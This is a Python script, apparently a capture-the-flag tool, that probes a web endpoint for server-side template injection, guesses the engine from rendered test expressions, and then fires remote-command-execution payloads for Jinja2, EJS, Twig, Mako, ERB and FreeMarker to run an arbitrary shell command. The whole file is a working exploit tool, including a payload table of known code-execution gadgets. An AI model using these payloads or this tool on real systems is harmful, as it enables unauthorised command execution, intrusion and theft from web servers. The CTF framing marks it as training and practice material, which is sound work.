#!/usr/bin/env python3
"""Detect SSTI, guess the engine, and optionally run a command.

    python ssti_probe.py http://inj3.chal.deti:8042/report --data "header=FUZZ"
    python ssti_probe.py http://inj6.chal.deti:8045/card --data "recipient=x&message=y&design=FUZZ"
    python ssti_probe.py "http://t/hello?name=FUZZ" --cmd "cat /flag/flag"
"""
import argparse
import html
import re
from urllib.parse import quote

import requests

DETECT = [
    ("jinja2/twig", "{{7*7}}", "49"),
    ("jinja2", "{{7*'7'}}", "7777777"),
    ("ejs/erb", "<%= 7*7 %>", "49"),
    ("freemarker/velocity/mako/thymeleaf", "${7*7}", "49"),
    ("pug/ruby", "#{7*7}", "49"),
    ("smarty", "{7*7}", "49"),
    ("handlebars/dot", "{{=7*7}}", "49"),
]
RCE = {
    "jinja2": ["{{ cycler.__init__.__globals__.os.popen(%s).read() }}",
               "{{ lipsum.__globals__.os.popen(%s).read() }}",
               "{{ self.__init__.__globals__.__builtins__.__import__('os').popen(%s).read() }}",
               "{{ config.__class__.__init__.__globals__['os'].popen(%s).read() }}"],
    "ejs": ["<%%= process.getBuiltinModule('child_process').execSync(%s).toString() %%>",
            "<%%= global.process.mainModule.require('child_process').execSync(%s).toString() %%>",
            "<%%= require('child_process').execSync(%s).toString() %%>"],
    "twig": ["{{[%s]|filter('system')}}"],
    "mako": ["${__import__('os').popen(%s).read()}"],
    "erb": ["<%%= `%s` %%>"],
    "freemarker": ['<#assign ex="freemarker.template.utility.Execute"?new()>${ex(%s)}'],
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data")
    ap.add_argument("--cmd")
    ap.add_argument("--engine", choices=list(RCE))
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def send(v):
        q = quote(v, safe="")
        if a.data:
            r = requests.post(a.url, data=a.data.replace("FUZZ", q), timeout=15,
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = requests.get(a.url.replace("FUZZ", q), headers=hdr, timeout=15)
        return html.unescape(r.text)

    base = send("zzbase")
    hits = []
    for name, p, want in DETECT:
        t = send(p)
        ok = want in t and want not in base
        print(f"{p:14} -> {'RENDERED ' + want if ok else 'no'}  ({name})")
        if ok:
            hits.append(name)
    engine = a.engine
    if not engine and hits:
        joined = " ".join(hits)
        engine = "jinja2" if "jinja2" in hits else "ejs" if "ejs/erb" in joined else \
            "twig" if "jinja2/twig" in hits else "mako" if "freemarker" in joined else None
    print(f"[i] engine guess: {engine}")
    if a.cmd and engine:
        for tpl in RCE[engine]:
            arg = a.cmd if engine == "erb" else repr(a.cmd)
            t = send(tpl % arg)
            fl = re.findall(r"flag\{[^}]+\}", t)
            print(f"--- {tpl % arg}\n{fl if fl else t[:400]}")
            if fl:
                break


if __name__ == "__main__":
    main()
